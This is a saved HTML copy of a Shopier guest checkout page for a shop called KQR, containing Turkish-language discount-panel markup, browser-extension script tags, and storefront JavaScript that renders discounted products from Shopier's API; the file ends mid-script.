<html lang="tr"><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-5FGVGWZ"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
	<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1.0, maximum-scale=5.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="csrf-token" content="1ba29495df56b60220e8e44a00a8b6b0bb161dd8e2ea7a8a57e3b65a3b19e8ec2710c6d9716e417ebbc9d0ba73a72c1df896c64e79eb6b63faf0cdb0e0d68d49">
<meta name="description" content="Güvenli ödeme, pratik alışveriş.">

<script> const shopName = "KQR";
</script>    <meta name="shopier">
	<meta name="csrf-token" content="1ba29495df56b60220e8e44a00a8b6b0bb161dd8e2ea7a8a57e3b65a3b19e8ec2710c6d9716e417ebbc9d0ba73a72c1df896c64e79eb6b63faf0cdb0e0d68d49">
    <title>Güvenli Sipariş | Shopier</title>
    <!-- BEGIN STYLES -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link rel="stylesheet" href="assets/css/index.css">
<link rel="stylesheet" href="assets/css/app.css">
<link rel="stylesheet" href="assets/css/custom.css">
<script src="https://code.jquery.com/jquery-3.7.0.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script><script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/traffic.js"></script>
<script src="assets/js/index.js" defer="defer"></script>
<script src="assets/js/custom.js" defer="defer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.9.6/lottie.min.js" defer="defer"></script>
<!-- END STYLES -->
<style></style>	<meta name="robots" content="noindex, follow">
</head>
<body class="checkout checkout-guest payment" __processed_0ab67746-c626-44e7-a089-433aabf432ee__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMiIsInNjb3JlIjoyMDAyMn1d">

<header class="header header-fixed">
    <nav class="navbar">
        <div class="container-store" bis_skin_checked="1">
            <div bis_skin_checked="1"><a class="search-back-btn" href="javascript:;">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M15.0003 20.67C14.8103 20.67 14.6203 20.6 14.4703 20.45L7.95027 13.93C6.89027 12.87 6.89027 11.13 7.95027 10.07L14.4703 3.55002C14.7603 3.26002 15.2403 3.26002 15.5303 3.55002C15.8203 3.84002 15.8203 4.32002 15.5303 4.61002L9.01027 11.13C8.53027 11.61 8.53027 12.39 9.01027 12.87L15.5303 19.39C15.8203 19.68 15.8203 20.16 15.5303 20.45C15.3803 20.59 15.1903 20.67 15.0003 20.67Z" fill="currentColor"></path>
                    </svg>
                    <span>Geri git</span></a>
                <div class="logo logo-primary" bis_skin_checked="1">
                    <img src="images/shopier_logo_1000_600.png" alt="shopier" width="110" height="32">
                </div>
                                    <div class="logo logo-secondary !hidden" bis_skin_checked="1">
                        <img src="https://cdn.shopier.app/logo_234/storefront_high-234.jpg" srcset="https://cdn.shopier.app/logo_468/storefront_high-234.jpg" alt="KQR">
                    </div>
                                <div class="flex items-center" bis_skin_checked="1">
                    <div class="store-title !hidden" bis_skin_checked="1">
                        <div bis_skin_checked="1">KQR</div>
                    </div>
                </div>
            </div>
                    </div>
    </nav>

</header>
<div class="header-hidden-effect !hidden" bis_skin_checked="1">
</div>
            <div id="discount-bar" class=" discount xy-top-bar  !hidden " bis_skin_checked="1">
            <div class="discount-main-layout-content" bis_skin_checked="1">
                <div class="notification-bar notification-bar-primary flex-row" data-redirect-url="" data-clickable="" data-discount-id="" bis_skin_checked="1">
                    <div class="notification-bar-header" bis_skin_checked="1">
                        <button id="defer-discount-notification" class="notification-bar-close">
                            <svg width="24" height="24" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M18 34.125C9.105 34.125 1.875 26.895 1.875 18C1.875 9.105 9.105 1.875 18 1.875C26.895 1.875 34.125 9.105 34.125 18C34.125 26.895 26.895 34.125 18 34.125ZM18 4.125C10.35 4.125 4.125 10.35 4.125 18C4.125 25.65 10.35 31.875 18 31.875C25.65 31.875 31.875 25.65 31.875 18C31.875 10.35 25.65 4.125 18 4.125Z" fill="#2F3352"></path>
                                <path d="M13.7541 23.3691C13.4691 23.3691 13.1841 23.2641 12.9591 23.0391C12.5241 22.6041 12.5241 21.8841 12.9591 21.4491L21.4491 12.9591C21.8841 12.5241 22.6041 12.5241 23.0391 12.9591C23.4741 13.3941 23.4741 14.1141 23.0391 14.5491L14.5491 23.0391C14.3391 23.2641 14.0391 23.3691 13.7541 23.3691Z" fill="#2F3352"></path>
                                <path d="M22.2441 23.3691C21.9591 23.3691 21.6741 23.2641 21.4491 23.0391L12.9591 14.5491C12.5241 14.1141 12.5241 13.3941 12.9591 12.9591C13.3941 12.5241 14.1141 12.5241 14.5491 12.9591L23.0391 21.4491C23.4741 21.8841 23.4741 22.6041 23.0391 23.0391C22.8141 23.2641 22.5291 23.3691 22.2441 23.3691Z" fill="#2F3352"></path>
                            </svg>
                            <span class="sr-only">Kapat</span></button>
                    </div>
                    <div class="notification-bar-body" bis_skin_checked="1">
                        <p class="notification-bar-text"></p>
                        <div id="notification-bar-button" class="flex justify-center mt-[9px] !hidden " bis_skin_checked="1">
                            <div class="notification-bar-action-btn " type="button" bis_skin_checked="1">
                                <span class="discount-button-text"> </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    <div class="offcanvas offcanvas-right discount-canvas" tabindex="-1" id="discountNotificationCanvas" aria-labelledby="discountNotificationCanvasLabel" data-bs-backdrop="static" bis_skin_checked="1">
    <div class="offcanvas-header" bis_skin_checked="1">
        <div class="container-store lg:px-[73px]" bis_skin_checked="1">
            <button class="discount-canvas-close" type="button" data-bs-dismiss="offcanvas" aria-label="Close">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M15.0003 20.67C14.8103 20.67 14.6203 20.6 14.4703 20.45L7.95027 13.93C6.89027 12.87 6.89027 11.13 7.95027 10.07L14.4703 3.55002C14.7603 3.26002 15.2403 3.26002 15.5303 3.55002C15.8203 3.84002 15.8203 4.32002 15.5303 4.61002L9.01027 11.13C8.53027 11.61 8.53027 12.39 9.01027 12.87L15.5303 19.39C15.8203 19.68 15.8203 20.16 15.5303 20.45C15.3803 20.59 15.1903 20.67 15.0003 20.67Z" fill="currentColor"></path>
                </svg>
                <span class="discount-back-text"></span></button>
        </div>
    </div>
    <div class="offcanvas-body xy-discount-offcanvas-body" style="" bis_skin_checked="1">
        <div class="flex justify-between" bis_skin_checked="1">
            <div class="container-store" bis_skin_checked="1">
                <div class="notification-bar notification-bar-secondary" bis_skin_checked="1">
                    <div class="notification-bar-header" bis_skin_checked="1"></div>
                    <div class="notification-bar-body" bis_skin_checked="1">
                        <p class="discount-information notification-bar-text">
                        </p>
                    </div>
                </div>
            </div>
        </div>
        <div class="flex justify-center mt-[19px] lg:mt-5" bis_skin_checked="1">
            <div class="container-store" bis_skin_checked="1">
                <ul class="discount-canvas-tab">
                    <li class="tabs-bar-item discount-canvas-tab-item cursor-pointer">
                        <div class="discount-canvas-tab-link active discount-add-text" bis_skin_checked="1"></div>
                    </li>
                    <li class="tabs-bar-item discount-canvas-tab-item cursor-pointer" id="discount-win-tab">
                        <div class="discount-canvas-tab-link discount-win-text" bis_skin_checked="1"></div>
                    </li>
                </ul>
            </div>
        </div>
        <div id="section-bar-addable" class="tabs-bar-content " bis_skin_checked="1">
            <div class="discount-canvas-categories discount-canvas-categories-addable" bis_skin_checked="1">
                <div class="container-store" bis_skin_checked="1">
                    <div class="tab-discount" bis_skin_checked="1">
                        <div class="swiper js-discount-tab-swiper swiper-initialized swiper-horizontal swiper-free-mode swiper-ios swiper-backface-hidden" bis_skin_checked="1">
                            <div class="swiper-wrapper" bis_skin_checked="1">
                                <div class="swiper-slide discount-clone-addable-category !hidden swiper-slide-active" style="margin-right: 10px;" bis_skin_checked="1">
                                    <button class="discount-canvas-category js-discount-canvas-category addable-category-button " type="button">
                                        <div bis_skin_checked="1"></div>
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div class="discount-addable-categories" bis_skin_checked="1">
                            <div class="swiper-button-prev-discount swiper-button-disabled swiper-button-lock" bis_skin_checked="1">
                                <div bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M15.0003 20.67C14.8103 20.67 14.6203 20.6 14.4703 20.45L7.95027 13.93C6.89027 12.87 6.89027 11.13 7.95027 10.07L14.4703 3.55002C14.7603 3.26002 15.2403 3.26002 15.5303 3.55002C15.8203 3.84002 15.8203 4.32002 15.5303 4.61002L9.01027 11.13C8.53027 11.61 8.53027 12.39 9.01027 12.87L15.5303 19.39C15.8203 19.68 15.8203 20.16 15.5303 20.45C15.3803 20.59 15.1903 20.67 15.0003 20.67Z" fill="currentColor"></path>
                                    </svg></div>
                            </div>
                            <div class="swiper-button-next-discount swiper-button-disabled swiper-button-lock" bis_skin_checked="1">
                                <div bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                                    </svg></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="flex justify-center addable_product_count-div" bis_skin_checked="1">
                <div class="container-store" bis_skin_checked="1">
                    <div class="discount-canvas-actions discount-canvas-actions-addable" bis_skin_checked="1">
                        <div class="relative h-[24px] lg:h-[17px] flex items-center" bis_skin_checked="1">
                            <span id="addable_product_count" class="text-14 font-medium text-[#9C9EAC] leading-[17px]"></span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="discount-canvas-products" bis_skin_checked="1">
                <div class="container-store" bis_skin_checked="1">
                    <div class="discount-canvas-products-grid addable-canvas-product" bis_skin_checked="1">
                        <div class="product-card placeholder addable-placeholder !hidden" bis_skin_checked="1">
                            <a href="javascript:void(0);" title="Product Title" role="link">
                                <div class="product-card-header" bis_skin_checked="1">
                                    <div class="product-card-image-container" bis_skin_checked="1"> </div>
                                </div>
                                <div class="product-card-body" bis_skin_checked="1">
                                    <div class="product-card-badges" bis_skin_checked="1"><span class="sr-only"></span><span class="sr-only"></span></div>
                                    <div class="product-card-title" bis_skin_checked="1">
                                        <h3 class="sr-only"></h3>
                                    </div>
                                    <div class="product-card-price" bis_skin_checked="1">
                                        <div class="price price-current" bis_skin_checked="1"><span class="sr-only"></span><span class="sr-only"></span><span class="sr-only"> </span></div>
                                        <div class="price price-old" bis_skin_checked="1"><span class="sr-only"></span><span class="sr-only"></span><span class="sr-only"></span></div>
                                    </div>
                                </div>
                            </a>
                        </div>
                    </div>
                    <div class="discount-canvas-products-grid addable-products" bis_skin_checked="1"></div>
                </div>
            </div>
        </div>
        <div class="product-card product-card-discount product-card-clone !hidden" bis_skin_checked="1">
            <a href="javascript:void(0);" class="discount-product-link" role="link">
                <div class="product-card-header" bis_skin_checked="1">
                    <div class="product-card-image-container" bis_skin_checked="1">
                        <picture>
                            <img class="w-full discount-image-wrapper" src="" alt="" width="226" height="226">
                        </picture>
                        <div class="product-card-no-stock !hidden" bis_skin_checked="1">
                            <div class="badge-no-stock" bis_skin_checked="1"></div>
                        </div>
                    </div>
                </div>
                <div class="product-card-body" bis_skin_checked="1">
                    <div class="product-card-badges" bis_skin_checked="1">
                        <div class="badge-left flex gap-x-1 items-start auto-badge !hidden" bis_skin_checked="1">
                            <svg class="purple-discount-badge mt-[-3px]" width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M6.71404 20.5743L6.71363 20.5739L2.775 16.2628L2.7744 16.2621C1.07567 14.4093 1.07442 11.6132 2.77531 9.74802L6.71363 5.43725L6.71364 5.43725L6.71544 5.43525C7.8252 4.20733 9.41962 3.5 11.0865 3.5H18.5844C20.7275 3.5 22.1758 3.98639 23.0951 4.90273C24.014 5.81872 24.5 7.25983 24.5 9.38889V16.6111C24.5 18.7402 24.014 20.1813 23.0951 21.0973C22.1758 22.0136 20.7275 22.5 18.5844 22.5H11.0865C9.41937 22.5 7.82417 21.7924 6.71404 20.5743Z" fill="white" fill-opacity="0.72" stroke="#0B0F34"></path>
                                <path d="M8.73388 14.5609C7.87837 13.7059 7.878 12.2934 8.73307 11.4379C9.58815 10.5824 11.0006 10.582 11.8561 11.4371C12.7116 12.2921 12.712 13.7046 11.8569 14.5601C11.0019 15.4156 9.5894 15.416 8.73388 14.5609Z" stroke="#0B0F34"></path>
                            </svg>
                            <span class="badge-only-number badge-discount auto-discount-rate"></span>
                        </div>
                        <span class="badge badge-discount  discount-rate !hidden"></span>
                        <span class="badge item-filter__badge !hidden"></span>
                    </div>
                    <div class="product-card-title" bis_skin_checked="1">
                        <h3 class="product-card-title-text discount-product-name"></h3>
                    </div>
                    <div class="product-card-price discount-container !hidden " bis_skin_checked="1">
                        <div class="price price-current" bis_skin_checked="1">
                            <span class="price-value"></span>
                            <span class="price-cent"></span>
                            <span class="price-currency"></span>
                        </div>
                        <div class="price price-old" bis_skin_checked="1">
                            <span class="price-value"></span>
                            <span class="price-cent"></span>
                            <span class="price-currency"></span>
                        </div>
                    </div>
                    <div class="product-card-price price-container !hidden" bis_skin_checked="1">
                        <div class="price price-current" bis_skin_checked="1">
                            <span class="price-value"></span>
                            <span class="price-cent"></span>
                            <span class="price-currency"></span>
                        </div>
                    </div>
                </div>
            </a>
        </div>
        <div id="section-bar-earnable" class="tabs-bar-content !hidden" bis_skin_checked="1">
            <div class="discount-canvas-categories discount-canvas-categories-earnable" bis_skin_checked="1">
                <div class="container-store" bis_skin_checked="1">
                    <div class="tab-discount" bis_skin_checked="1">
                        <div class="swiper js-discount-tab-swiper2 swiper-initialized swiper-horizontal swiper-free-mode swiper-ios" bis_skin_checked="1">
                            <div class="swiper-wrapper" bis_skin_checked="1" style="transition-duration: 0ms; transition-delay: 0ms;">
                                <div class="swiper-slide discount-clone-earnable-category !hidden" bis_skin_checked="1">
                                    <button class="discount-canvas-category js-discount-canvas-category earnable-category-button" type="button">
                                        <div bis_skin_checked="1"></div>
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div class="discount-earnable-categories" bis_skin_checked="1">
                            <div class="swiper-button-prev-discount2" bis_skin_checked="1">
                                <div bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M15.0003 20.67C14.8103 20.67 14.6203 20.6 14.4703 20.45L7.95027 13.93C6.89027 12.87 6.89027 11.13 7.95027 10.07L14.4703 3.55002C14.7603 3.26002 15.2403 3.26002 15.5303 3.55002C15.8203 3.84002 15.8203 4.32002 15.5303 4.61002L9.01027 11.13C8.53027 11.61 8.53027 12.39 9.01027 12.87L15.5303 19.39C15.8203 19.68 15.8203 20.16 15.5303 20.45C15.3803 20.59 15.1903 20.67 15.0003 20.67Z" fill="currentColor"></path>
                                    </svg></div>
                            </div>
                            <div class="swiper-button-next-discount2" bis_skin_checked="1">
                                <div bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                                    </svg></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="flex justify-center earnable_product_count-div" bis_skin_checked="1">
                <div class="container-store" bis_skin_checked="1">
                    <div class="discount-canvas-actions discount-canvas-actions-earnable" bis_skin_checked="1">
                        <div class="relative h-[24px] lg:h-[17px] flex items-center" bis_skin_checked="1">
                            <span id="earnable_product_count" class="text-14 font-medium text-[#9C9EAC] leading-[17px]"></span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="discount-canvas-products" bis_skin_checked="1">
                <div class="container-store" bis_skin_checked="1">
                    <div class="discount-canvas-products-grid earnable-canvas-product" bis_skin_checked="1">
                        <div class="product-card placeholder earnable-placeholder !hidden" bis_skin_checked="1">
                            <a href="javascript:void(0);" title="Product Title" role="link">
                                <div class="product-card-header" bis_skin_checked="1">
                                    <div class="product-card-image-container" bis_skin_checked="1"> </div>
                                </div>
                                <div class="product-card-body" bis_skin_checked="1">
                                    <div class="product-card-badges" bis_skin_checked="1"><span class="sr-only"></span><span class="sr-only"></span></div>
                                    <div class="product-card-title" bis_skin_checked="1">
                                        <h3 class="sr-only"></h3>
                                    </div>
                                    <div class="product-card-price" bis_skin_checked="1">
                                        <div class="price price-current" bis_skin_checked="1"><span class="sr-only"></span><span class="sr-only"></span><span class="sr-only"> </span></div>
                                        <div class="price price-old" bis_skin_checked="1"><span class="sr-only"></span><span class="sr-only"></span><span class="sr-only"></span></div>
                                    </div>
                                </div>
                            </a>
                        </div>
                    </div>
                    <div class="discount-canvas-products-grid earnable-products" bis_skin_checked="1"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="offcanvas-footer" style="border-top-width: 0px;" bis_skin_checked="1"></div>
</div>

<script>
    function updateDiscountStorage(newValue) {
        const mainObject = JSON.parse(sessionStorage.getItem("KQR") || '{}');
        mainObject.discountStorage = newValue;
        sessionStorage.setItem("KQR", JSON.stringify(mainObject));
    }
    updateDiscountStorage(null);


    document.querySelector('.notification-bar-close')?.addEventListener('click',function (){
        document.querySelector('.discount-main-layout.discount').remove()
    });
    document.addEventListener('DOMContentLoaded', function () {
        const tabs = document.querySelectorAll('.tabs-bar-item > div');
        const sections = document.querySelectorAll('.tabs-bar-content');
        tabs.forEach((tab, index) => {
            tab.addEventListener('click', function (event) {
                event.preventDefault();
                tabs.forEach(tab => tab.classList.remove('active'));

                sections.forEach(section => section.classList.add('!hidden'));

                tab.classList.add('active');

                sections[index].classList.remove('!hidden');
            });
        });
    });
    function discountImageGenerator(product, productCard){
        productCard.querySelector('.discount-product-link').href = product.link;
        productCard.querySelector('.discount-image-wrapper').src = product.image_prefix + product.image_endpoints.mid + product.image;
        productCard.querySelector('.discount-image-wrapper').srcset = product.image_prefix + product.image_endpoints.mid + product.image;
        productCard.querySelector('.discount-product-name').innerHTML = product.name;
    }

    function discountPriceGenerator(item, newProduct) {
        const discountContainer = newProduct.querySelector('.discount-container');
        const priceContainer = newProduct.querySelector('.price-container');
        const {price_code, price_symbol, price_without_cent, has_cent, price_cent} = item.price;
        const {
            price_formatted = "0",
            price_code: original_code = "USD",
            price_symbol: original_symbol = "$",
            price_without_cent: original_without_cent = 0,
            price_cent: original_cent = "00"
        } = item.original_price || {};

        const formatPrice = (price, symbol, cent, code, isTL) => ({
            value: isTL ? price : symbol + price,
            centClass: has_cent ? '' : '!hidden',
            codeClass: isTL ? '' : '!hidden',
            code
        });

        const createPriceTemplate = ({value, centClass, codeClass, code}, priceClass) => `
        <div class="price ${priceClass}">
            <span class="price-value">${value}</span>
            <span class="price-cent ${centClass}">${price_cent}</span>
            <span class="price-currency ${codeClass}">${code}</span>
        </div>`;

        const isTL = price_code === 'TL';
        const priceData = formatPrice(price_without_cent, price_symbol, price_cent, price_code, isTL);
        const discountPriceData = formatPrice(original_without_cent, original_symbol, original_cent, original_code, isTL);


        const priceTemplate = createPriceTemplate(priceData, 'price-current price-new');
        const discountTemplate = createPriceTemplate(discountPriceData, 'price-old');

        if (parseInt(price_formatted) !== 0) {
            discountContainer.classList.remove("!hidden");
            discountContainer.innerHTML = priceTemplate + discountTemplate;
        } else {
            priceContainer.classList.remove('!hidden');
            priceContainer.innerHTML = priceTemplate;
        }
    }

    function setDiscountContainer(item, newProduct) {
        let productCardPurpleBadge = newProduct.querySelector('.auto-badge');
        let productDiscountRate = newProduct.querySelector('.discount-rate');
        let productAutoDiscountRate = newProduct.querySelector('.auto-discount-rate');
        if (item.is_discounted) {
            if (item.is_self_discounted) {
                productDiscountRate.classList.remove('!hidden')
                productDiscountRate.innerText = "%"+item.discount_label_rate +' '+'İndirim';
            }
            if (item.discount_label_type === "automatic_discount") {
                productCardPurpleBadge.classList.remove('!hidden');
                productDiscountRate.classList.add('!hidden')
                productAutoDiscountRate.innerText = "% " + item.discount_label_rate + "";
            }
        }
    }

    function setDiscountProductLabel(item, newProduct) {
        let productCardBadgeEl = newProduct.querySelector('.item-filter__badge');
        if (item.label !== null) {
            productCardBadgeEl.classList.remove('!hidden');
            productCardBadgeEl.textContent = item.label_text;
            if (item.label === 'out_of_stock'){
                newProduct.querySelector('.product-card-no-stock').classList.remove('!hidden')
                newProduct.querySelector('.badge-no-stock').innerText = 'Tükendi'
            }
        } else {
            productCardBadgeEl.classList.remove('block');
            productCardBadgeEl.classList.add("!hidden");
        }
    }

    function discountBadgeGenerator(item, newProduct) {
        const productCardBadges = newProduct.querySelector('.product-card-badges')
        if ((item.label === null || item.label === 'out_of_stock') && !item.is_discounted) {
            productCardBadges.classList.add('!hidden');
        } else {
            productCardBadges.classList.remove('!hidden');
            setDiscountContainer(item, newProduct);
        }
        /* For out of stock case */
        setDiscountProductLabel(item, newProduct);
    }

    let isDiscountLoader = false;

    function showDiscountLoader() {
        if (!isDiscountLoader) {
            let addableLoaderClear = document.querySelector('.addable-placeholder')
            let earnableLoaderClear = document.querySelector('.earnable-placeholder')
            let addableButtonPlaceholder = document.querySelectorAll('.addable-category-button')
            let earanableButtonPlaceholder = document.querySelectorAll('.earnable-category-button')
            const addableContainer = document.querySelector('.addable-canvas-product')
            const earnableContainer = document.querySelector('.earnable-canvas-product')
            const addableGrid = document.querySelector('.addable-products');
            const earnableGrid = document.querySelector('.earnable-products');
            addableButtonPlaceholder.forEach(function (element){
                element.classList.add('placeholder')
                element.querySelector('div').classList.add('sr-only')
            })
            earanableButtonPlaceholder.forEach(function (element){
                element.classList.add('placeholder')
                element.querySelector('div').classList.add('sr-only')
            })

            for (let i = 0; i < 24; i++) {
                let addableClone = addableLoaderClear.cloneNode(true);
                let earnableClone = earnableLoaderClear.cloneNode(true);
                addableClone?.classList.remove('!hidden');
                earnableClone?.classList.remove('!hidden');
                addableContainer?.appendChild(addableClone);
                earnableContainer?.appendChild(earnableClone);
            }
            addableGrid.classList.add('!hidden')
            earnableGrid.classList.add('!hidden')
            isDiscountLoader = true;
        }
    }

    function hideDiscountLoader() {
        let addableLoaderClear = document.querySelectorAll('.addable-placeholder')
        let earnableLoaderClear = document.querySelectorAll('.earnable-placeholder')
        let addableButtonPlaceholder = document.querySelectorAll('.addable-category-button')
        let earanableButtonPlaceholder = document.querySelectorAll('.earnable-category-button')
        const addableGrid = document.querySelector('.addable-products');
        const earnableGrid = document.querySelector('.earnable-products');
        addableButtonPlaceholder.forEach(function (element){
            element.classList.remove('placeholder')
            element.querySelector('div').classList.remove('sr-only')
        })
        earanableButtonPlaceholder.forEach(function (element){
            element.classList.remove('placeholder')
            element.querySelector('div').classList.remove('sr-only')
        })
        addableLoaderClear.forEach(function (element){
            element.classList.add('!hidden')
        })
        earnableLoaderClear.forEach(function (element){
            element.classList.add('!hidden')
        })
        addableGrid.classList.remove('!hidden')
        earnableGrid.classList.remove('!hidden')
        isDiscountLoader = false;
    }

    async function getDiscountData(request_type, discount_id) {
        let body = JSON.parse(sessionStorage.getItem('KQR'))['discountStorage']["shop_" + shopName];
        const params = new URLSearchParams({
            request_type: request_type,
            discount_id: discount_id
        }).toString();
        return await fetch(
            `https://www.shopier.com/s/api/v1/discount?username=${shopName}&${params}`,
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(body),
            }
        );
    }

    function attachDiscountCategoryChipEvent() {
        let discountCategoryButtons = document.querySelectorAll(".discount-canvas-category");
        discountCategoryButtons.forEach(function (button) {
            button.addEventListener("click", async function (e) {
                showDiscountLoader()
                let discountCategoryId = e.currentTarget.getAttribute('data-discount-category-id');
                let discountChipType = e.currentTarget.getAttribute('data-discount-chip-type');
                let discountStorage = JSON.parse(sessionStorage.getItem('KQR'))['discountStorage']["shop_" + shopName];

                if (discountChipType === "addable") {
                    let addableChip = document.querySelector('.addable-category-button.active');
                    addableChip?.classList.remove('active');
                    e.currentTarget.classList?.add('active');
                    discountStorage.addable_product.listing_features.load_more.status = true;
                    discountStorage.addable_product.listing_features.load_more.method =
                        "by_category";
                    discountStorage.addable_product.listing_features.load_more.category_id =
                        discountCategoryId;
                    discountStorage.addable_product.listing_features.offset = 0;
                }
                if (discountChipType === "earnable") {

                    let earnableChip = document.querySelector('.earnable-category-button.active');
                    earnableChip?.classList.remove('active');
                    e.currentTarget.classList?.add('active');
                    discountStorage.earnable_product.listing_features.load_more.status = true;
                    discountStorage.earnable_product.listing_features.load_more.method =
                        "by_category";
                    discountStorage.earnable_product.listing_features.load_more.category_id =
                        discountCategoryId;
                    discountStorage.earnable_product.listing_features.offset = 0;
                }
                let discountId = discountStorage.discount_id;
                let newDiscountStorage = {
                    shop_KQR: discountStorage
                };
                updateDiscountStorage(newDiscountStorage)

                let requestType = (discountChipType === "addable") ? "get_discount_product_for_add" : "get_discount_product_for_earn";
                let data = await getDiscountData(requestType, discountId).then(
                    (response) => response.json()
                );
                const addableGrid = document.querySelector('.addable-products');
                const earnableGrid = document.querySelector('.earnable-products');


                if (data["addable_data"]) {
                    addableGrid.innerHTML = '';
                    const addableData = data.addable_data.product_data.products;
                    document.getElementById('addable_product_count').textContent = data.addable_data.product_data.pagination.total_text;
                    addableData.forEach(product => {
                        const addableTotal = data.addable_data.product_data.pagination.total;
                        listProduct(product, addableGrid, 'addable', addableTotal, null);

                    });
                }
                if (data["earnable_data"]) {
                    earnableGrid.innerHTML = '';
                    const earnableData = data.earnable_data.product_data.products;
